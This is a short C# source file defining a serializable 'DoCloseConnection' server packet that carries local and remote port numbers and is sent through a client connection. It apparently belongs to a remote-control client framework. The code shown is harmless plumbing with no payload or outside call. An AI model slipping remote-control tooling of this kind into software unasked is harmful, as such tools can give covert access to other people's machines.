using System;
using xClient.Core.Networking;

namespace xClient.Core.Packets.ServerPackets
{
    [Serializable]
    public class DoCloseConnection : IPacket
    {
        public int LocalPort { get; set; }

        public int RemotePort { get; set; }

        public DoCloseConnection()
        {
        }

        public DoCloseConnection(int localport, int remoteport)
        {
            this.LocalPort = localport;
            this.RemotePort = remoteport;
        }

        public void Execute(Client client)
        {
            client.Send(this);
        }
    }
}
